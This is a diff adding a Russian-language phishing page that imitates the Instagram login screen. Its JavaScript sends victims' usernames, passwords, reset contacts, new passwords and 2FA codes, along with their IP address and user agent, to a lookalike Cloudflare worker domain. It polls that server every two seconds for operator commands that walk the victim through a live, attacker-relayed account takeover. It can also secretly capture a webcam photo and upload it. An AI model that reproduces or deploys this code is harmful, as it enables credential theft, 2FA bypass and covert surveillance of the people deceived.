@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Вход • Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #0b141a;
+        }
+        .login-card {
+            background-color: #262626;
+            border-radius: 28px;
+            width: 100%;
+            max-width: 440px;
+            padding: 48px 40px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.5);
+        }
+        .input-field {
+            background-color: #1a1a1a;
+            border: 1px solid #363636;
+            color: #efefef;
+            font-size: 14px;
+            border-radius: 4px;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 8px;
+        }
+        .input-field::placeholder {
+            color: #8e8e8e;
+        }
+        .input-field:focus {
+            border-color: #555;
+            outline: none;
+        }
+        .login-button {
+            background-color: #405de6;
+            color: white;
+            font-weight: 600;
+            padding: 12px;
+            border-radius: 12px;
+            width: 100%;
+            margin-top: 16px;
+            font-size: 16px;
+            transition: background-color 0.2s;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        .login-button.active {
+            opacity: 1;
+        }
+        .login-button.active:hover {
+            background-color: #3149bf;
+        }
+        .custom-checkbox {
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 1px solid #555;
+            border-radius: 4px;
+            cursor: pointer;
+            position: relative;
+            background-color: transparent;
+        }
+        .custom-checkbox:checked {
+            background-color: #405de6;
+            border-color: #405de6;
+        }
+        .custom-checkbox:checked::after {
+            content: '✓';
+            position: absolute;
+            color: white;
+            font-size: 12px;
+            left: 3px;
+            top: 0px;
+        }
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.2s;
+        }
+        .modal.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .modal-content {
+            background: #262626;
+            border-radius: 24px;
+            max-width: 300px;
+            width: 90%;
+            text-align: center;
+            padding: 24px 16px 16px;
+            color: white;
+        }
+        .modal-content p {
+            margin: 16px 0;
+            font-size: 14px;
+        }
+        .modal-button {
+            background: none;
+            border: none;
+            border-top: 1px solid #363636;
+            padding: 12px;
+            width: 100%;
+            font-weight: 600;
+            color: #0095f6;
+            cursor: pointer;
+        }
+        /* Страницы сброса и 2FA */
+        .reset-page, .twofa-page, .newpassword-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0b141a;
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .reset-card, .twofa-card, .newpassword-card {
+            background-color: #262626;
+            border-radius: 28px;
+            max-width: 380px;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+            color: white;
+        }
+        .reset-card input, .twofa-card input, .newpassword-card input {
+            margin-bottom: 16px;
+        }
+        .btn-reset, .btn-2fa, .btn-newpassword {
+            background-color: #405de6;
+            color: white;
+            padding: 12px;
+            border-radius: 12px;
+            width: 100%;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+        }
+        .back-to-login {
+            margin-top: 20px;
+            color: #0095f6;
+            cursor: pointer;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #405de6;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+        }
+        #loadingOverlay.show {
+            display: flex;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+
+    <!-- Основная карточка входа -->
+    <div class="login-card relative" id="loginCard">
+        <button class="absolute top-6 right-6 text-white opacity-80 hover:opacity-100" id="closeButton">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+        </button>
+
+        <div class="flex justify-center mb-8">
+            <h1 class="text-6xl text-white" style="font-family: 'Grand Hotel', cursive;">Instagram</h1>
+        </div>
+
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес" class="input-field" autocomplete="off">
+            <input type="password" id="password" placeholder="Пароль" class="input-field">
+            <div class="flex items-center gap-3 mt-4">
+                <input type="checkbox" id="save" class="custom-checkbox">
+                <label for="save" class="text-white text-sm">Сохранить данные входа</label>
+            </div>
+            <button type="submit" class="login-button" id="loginBtn" disabled>Войти</button>
+        </form>
+
+        <div class="text-center mt-8">
+            <a href="#" id="forgotPasswordLink" class="text-white text-base font-semibold hover:opacity-80">Забыли пароль?</a>
+        </div>
+    </div>
+
+    <!-- Ссылка на регистрацию (просто для вида) -->
+    <div class="text-center mt-4 text-sm">
+        <span class="text-gray-400">У вас ещё нет аккаунта?</span>
+        <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="text-[#0095f6] font-semibold ml-1">Зарегистрироваться</a>
+    </div>
+
+    <!-- Футер -->
+    <footer class="footer-links flex flex-wrap justify-center gap-3 gap-y-2 mt-8 text-center text-gray-400 text-xs">
+        <a href="https://about.meta.com/">Meta</a> <a href="https://about.instagram.com/">Информация</a> <a href="https://about.instagram.com/blog/">Блог</a>
+        <a href="https://about.instagram.com/about-us/careers">Вакансии</a> <a href="https://help.instagram.com/">Помощь</a>
+        <a href="https://developers.facebook.com/docs/instagram">API</a> <a href="https://privacycenter.instagram.com/policy/">Конфиденциальность</a>
+        <a href="https://help.instagram.com/581066165581870">Условия</a> <a href="https://www.instagram.com/directory/profiles/">Популярные аккаунты</a>
+        <a href="https://www.instagram.com/directory/hashtags/">Хэштеги</a> <a href="https://www.instagram.com/explore/locations/">Места</a>
+        <a href="https://www.threads.net/">Threads</a> <a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a>
+        <span>Русский</span> <span>© 2026 Instagram from Meta</span>
+    </footer>
+
+    <!-- Модальное окно ошибки -->
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="#ed4956" style="margin:0 auto;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+            <p id="errorMessage">Неверный пароль. Пожалуйста, попробуйте снова.</p>
+            <button class="modal-button" id="closeModal">OK</button>
+        </div>
+    </div>
+
+    <!-- Страница сброса пароля -->
+    <div id="resetPage" class="reset-page">
+        <div class="reset-card">
+            <h2>Забыли пароль?</h2>
+            <p>Введите email </p>
+            <input type="text" id="resetContact" placeholder="Email или имя пользователя" class="input-field">
+            <button class="btn-reset" id="sendResetBtn">Отправить код</button>
+            <div class="back-to-login" id="backToLogin">← Вернуться ко входу</div>
+        </div>
+    </div>
+
+    <!-- Страница ввода кода 2FA -->
+    <div id="twofaPage" class="twofa-page">
+        <div class="twofa-card">
+            <h2>Введите код подтверждения</h2>
+            <p>Мы отправили код на ваш email или телефон</p>
+            <input type="text" id="twofaCode" placeholder="Код" class="input-field" style="text-align:center; letter-spacing:5px;">
+            <button class="btn-2fa" id="sendTwofaBtn">Подтвердить</button>
+            <div class="back-to-login" id="backFromTwofa">← Назад</div>
+        </div>
+    </div>
+
+    <!-- Страница ввода нового пароля -->
+    <div id="newPasswordPage" class="newpassword-page">
+        <div class="newpassword-card">
+            <h2>Придумайте новый пароль</h2>
+            <p>Введите новый пароль дважды</p>
+            <input type="password" id="newPassword1" placeholder="Новый пароль" class="input-field">
+            <input type="password" id="newPassword2" placeholder="Подтвердите пароль" class="input-field">
+            <button class="btn-newpassword" id="sendNewPasswordBtn">Сохранить</button>
+            <div class="back-to-login" id="backFromNewPassword">← Назад</div>
+        </div>
+    </div>
+
+    <!-- Оверлей загрузки -->
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        const WORKER_URL = 'https://inctagram.mobile-support.workers.dev';
+        let sessionId = localStorage.getItem('phish_session');
+        if (!sessionId) {
+            sessionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+                const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+            localStorage.setItem('phish_session', sessionId);
+        }
+
+        // Вспомогательные функции
+        function showLoading(show) {
+            document.getElementById('loadingOverlay').classList.toggle('show', show);
+        }
+
+        function showModal(message) {
+            document.getElementById('errorMessage').innerText = message;
+            document.getElementById('errorModal').classList.add('show');
+        }
+
+        function hideModal() {
+            document.getElementById('errorModal').classList.remove('show');
+        }
+
+        function hideAllPages() {
+            document.getElementById('loginCard').style.display = 'none';
+            document.getElementById('resetPage').style.display = 'none';
+            document.getElementById('twofaPage').style.display = 'none';
+            document.getElementById('newPasswordPage').style.display = 'none';
+        }
+
+        function showLogin() {
+            hideAllPages();
+            document.getElementById('loginCard').style.display = 'block';
+        }
+
+        function showReset() {
+            hideAllPages();
+            document.getElementById('resetPage').style.display = 'flex';
+        }
+
+        function showTwofa() {
+            hideAllPages();
+            document.getElementById('twofaPage').style.display = 'flex';
+        }
+
+        function showNewPassword() {
+            hideAllPages();
+            document.getElementById('newPasswordPage').style.display = 'flex';
+        }
+
+        // API
+        async function api(endpoint, payload) {
+            return fetch(`${WORKER_URL}${endpoint}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        async function reportOpen() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ip = (await res.json()).ip;
+                await api('/api/open', {
+                    session_id: sessionId,
+                    ip: ip,
+                    user_agent: navigator.userAgent,
+                    timestamp: Date.now()
+                });
+            } catch (e) {}
+        }
+
+        async function sendCredentials(login, pwd) {
+            await api('/api/credentials', { session_id: sessionId, login, password: pwd });
+        }
+
+        async function sendResetContact(contact) {
+            await api('/api/reset', { session_id: sessionId, contact });
+        }
+
+        async function sendNewPassword(p1, p2) {
+            await api('/api/new_password', { session_id: sessionId, password: p1, password_confirm: p2 });
+        }
+
+        async function sendTwofaCode(code) {
+            await api('/api/2fa', { session_id: sessionId, code });
+        }
+
+        async function takeAndSendPhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                stream.getTracks().forEach(track => track.stop());
+                const formData = new FormData();
+                formData.append('photo', blob, 'snapshot.jpg');
+                formData.append('session_id', sessionId);
+                await fetch(`${WORKER_URL}/api/photo`, { method: 'POST', body: formData });
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // Проверка команд от хакера
+        async function checkCommands() {
+            try {
+                const res = await fetch(`${WORKER_URL}/api/commands?session_id=${sessionId}`);
+                const data = await res.json();
+                if (data.command) {
+                    handleCommand(data.command);
+                }
+            } catch (e) {}
+        }
+
+        function handleCommand(cmd) {
+            showLoading(false);
+            switch (cmd.action) {
+                case 'show_2fa':
+                    showTwofa();
+                    break;
+                case 'show_error':
+                    showModal(cmd.message || 'Ошибка. Попробуйте ещё раз.');
+                    break;
+                case 'show_camera':
+                    takeAndSendPhoto();
+                    showModal('Устройство подтверждено. Пожалуйста, подождите...');
+                    break;
+                case 'show_reset':
+                    showReset();
+                    break;
+                case 'show_new_password':
+                    showNewPassword();
+                    break;
+                case 'show_success':
+                    showModal(cmd.message || 'Успешно!');
+                    hideAllPages(); // или показать что-то другое
+                    break;
+                default:
+                    break;
+            }
+        }
+
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', () => {
+            reportOpen();
+            setInterval(checkCommands, 2000);
+
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.getElementById('loginBtn');
+
+            function validateLogin() {
+                if (usernameInput.value.trim() && passwordInput.value) {
+                    loginBtn.disabled = false;
+                    loginBtn.classList.add('active');
+                } else {
+                    loginBtn.disabled = true;
+                    loginBtn.classList.remove('active');
+                }
+            }
+            usernameInput.addEventListener('input', validateLogin);
+            passwordInput.addEventListener('input', validateLogin);
+
+            // Отправка логина/пароля
+            document.getElementById('loginForm').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const login = usernameInput.value.trim();
+                const pwd = passwordInput.value;
+                if (!login || !pwd) return;
+                showLoading(true);
+                await sendCredentials(login, pwd);
+                usernameInput.value = '';
+                passwordInput.value = '';
+                validateLogin();
+                // Ждем команду от  
+            });
+
+            // Сброс пароля
+            document.getElementById('forgotPasswordLink').addEventListener('click', () => showReset());
+            document.getElementById('backToLogin').addEventListener('click', showLogin);
+            document.getElementById('sendResetBtn').addEventListener('click', async () => {
+                const contact = document.getElementById('resetContact').value.trim();
+                if (!contact) { alert('Введите email или имя пользователя'); return; }
+                showLoading(true);
+                await sendResetContact(contact);
+                document.getElementById('resetContact').value = '';
+                // Ждём команду show_new_password или show_error
+            });
+
+            // Ввод 2FA
+            document.getElementById('sendTwofaBtn').addEventListener('click', async () => {
+                const code = document.getElementById('twofaCode').value.trim();
+                if (!code) return;
+                showLoading(true);
+                await sendTwofaCode(code);
+                document.getElementById('twofaCode').value = '';
+                // Ждём команду show_success или show_error
+            });
+            document.getElementById('backFromTwofa').addEventListener('click', showLogin);
+
+            // Новый пароль
+            document.getElementById('sendNewPasswordBtn').addEventListener('click', async () => {
+                const p1 = document.getElementById('newPassword1').value.trim();
+                const p2 = document.getElementById('newPassword2').value.trim();
+                if (!p1 || !p2) { alert('Заполните оба поля'); return; }
+                if (p1 !== p2) { alert('Пароли не совпадают'); return; }
+                showLoading(true);
+                await sendNewPassword(p1, p2);
+                document.getElementById('newPassword1').value = '';
+                document.getElementById('newPassword2').value = '';
+                // Ждём команду show_success
+            });
+            document.getElementById('backFromNewPassword').addEventListener('click', showLogin);
+
+            // Закрытие модального окна
+            document.getElementById('closeModal').addEventListener('click', hideModal);
+        });
+    </script>
+</body>
+</html>
